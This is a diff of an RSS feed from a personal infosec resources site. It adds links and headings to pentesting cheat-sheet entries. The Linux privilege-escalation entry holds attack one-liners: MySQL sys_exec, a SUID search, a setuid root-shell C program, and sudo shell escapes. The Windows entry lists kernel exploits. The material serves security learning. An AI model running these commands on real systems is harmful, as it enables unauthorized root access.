@@ -29,7 +29,7 @@
  Exploit Education
  Exploit Database
  Reverse.It - free malware analysis service
-  Courses and Labs  Labs for the Computer and Network Security Class</description>
+  Courses and Labs  Hack The Box</description>
     </item>
     
     <item>
@@ -70,7 +70,7 @@ Links  https://rastamouse.me - hacking Windows  </description>
       
       <guid>https://d47zm3.me/resources/infosec/bugbounty/</guid>
       <description>Communities Bug Bounty Notes - founded by zseano, challenges, writeups, etc.
-Bug Bounty Tips  nmap --script &amp;quot;http-*&amp;quot; IP/target - will run 30+ scripts related to HTTP, SQLInjection, config backup checks, checkout more at the docs http://nmap.org/nsedoc  Files To Look Out For  .git/config
+Blogs  zseano blog with tutorials  Bug Bounty Tips  nmap --script &amp;quot;http-*&amp;quot; IP/target - will run 30+ scripts related to HTTP, SQLInjection, config backup checks, checkout more at the docs http://nmap.org/nsedoc  Files To Look Out For  .git/config
  .travis.yml
  Makefile
  Dockerfile
@@ -299,7 +299,7 @@ Interesting Sites  Official Docs - best resource for Kubernetes
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</guid>
-      <description>MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command.
+      <description>Links  Basic Linux Privilege Escalation  MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command.
 select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them find / -user root -perm -4000 -print 2&amp;gt;/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt; int main() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c &amp;#34;import pty; pty.</description>
     </item>
     
@@ -541,6 +541,15 @@ GitHub Secret Leaks:
     </item>
     
     <item>
+      <title>Serverless</title>
+      <link>https://d47zm3.me/resources/infosec/serverless/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/serverless/</guid>
+      <description> Links  Serverless Toolkit For Pentesters  </description>
+    </item>
+    
+    <item>
       <title>Shells</title>
       <link>https://d47zm3.me/resources/environment/shells/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -675,7 +684,13 @@ rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch key
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/windows-privilege-escalation/</guid>
-      <description>Windows Exploit/OS Reference Scripts  JAWS Sherlock Powerup Google Windows Version for common exploits  Kernel Exploits  systeminfo -&amp;gt; look up missing kb&amp;rsquo;s systeminfo | findstr /B /C:&amp;ldquo;OS Name&amp;rdquo; /C:&amp;ldquo;OS * Version&amp;rdquo; sherlock -&amp;gt; Find-AllVulns powershell  Common Kernel Exploits  MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - &amp;lsquo;WebDAV&amp;rsquo; applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2  Config Files Credentials in ClearText or Base64 -&amp;gt; once Windows in installed</description>
+      <description>Windows Exploit/OS Reference Scripts  JAWS Sherlock Powerup Google Windows Version for common exploits  Links  PE Methods for Pentesters
+ Level Up! Practical Windows Privilege Escalation - Andrew Smith
+ Windows Privilege Escalation Guide
+ Practical Usage of NTLM Hashes
+ AD Security Blog
+ Dumping Windows Credentials
+  Kernel Exploits  systeminfo -&amp;gt; look up missing kb&amp;rsquo;s systeminfo | findstr /B /C:&amp;ldquo;OS Name&amp;rdquo; /C:&amp;ldquo;OS * Version&amp;rdquo; sherlock -&amp;gt; Find-AllVulns powershell  Common Kernel Exploits  MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - &amp;lsquo;WebDAV&amp;rsquo; applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2  Config Files Credentials in ClearText or Base64 -&amp;gt; once Windows in installed</description>
     </item>
     
     <item>
